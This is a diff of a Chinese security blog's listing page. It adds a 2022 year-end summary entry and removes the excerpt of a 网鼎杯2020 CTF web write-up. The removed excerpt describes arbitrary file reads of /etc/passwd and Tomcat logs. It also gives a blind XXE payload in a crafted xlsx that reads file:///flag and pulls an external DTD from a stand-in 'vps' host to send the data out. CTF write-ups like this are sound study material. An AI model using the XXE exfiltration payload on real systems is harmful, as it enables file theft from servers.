@@ -141,6 +141,19 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">2022年度总结
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 2022年是一个记得被纪念的年份, 不是因为它有多好, 而是因为它有多现实
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-12-31 22:31:25 +0000 UTC'>December 31, 2022</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;88 words&nbsp;·&nbsp;ch3n9w</footer>
+  <a class="entry-link" aria-label="post link to 2022年度总结" href="https://ch3n9w.cpolar.cn/posts/gossip-2022-summary/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">小阳人日记
     </h2>
   </header>
@@ -438,31 +451,6 @@ Web-Inf文件夹中除了有classes文件夹和一个web.xml文件外、还有li
   </div>
   <footer class="entry-footer"><span title='2020-08-20 13:16:50 +0000 UTC'>August 20, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;306 words&nbsp;·&nbsp;ch3n9w</footer>
   <a class="entry-link" aria-label="post link to ciscn2020_online" href="https://ch3n9w.cpolar.cn/posts/ctf-ciscn2020-online/"></a>
-</article>
-
-<article class="post-entry"> 
-<figure class="entry-cover">
-        <img loading="lazy" srcset="https://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu2329845373736822590.png 360w ,https://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu6059930348231977431.png 480w ,https://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu14153619774600876245.png 720w ,https://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu1815663425424639361.png 1080w ,https://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501.png 1375w" 
-            sizes="(min-width: 768px) 720px, 100vw" src="https://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501.png" alt="" 
-            width="1375" height="597">
-</figure>
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">网鼎杯2020 web
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
-绝对路径
-/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
-读日志文件 logs/catalina.out
-​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
-if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
-新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
-&lt;?xml version=&#34;1.0&#34;?&gt; &lt;!DOCTYPE r [ &lt;!ENTITY % data3 SYSTEM &#34;file:///flag&#34;&gt; &lt;!ENTITY % sp SYSTEM &#34;http://vps/ext.dtd&#34;&gt; %sp; %param3; %exfil; ]&gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2020-05-11 16:11:31 +0000 UTC'>May 11, 2020</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;796 words&nbsp;·&nbsp;ch3n9w</footer>
-  <a class="entry-link" aria-label="post link to 网鼎杯2020 web" href="https://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
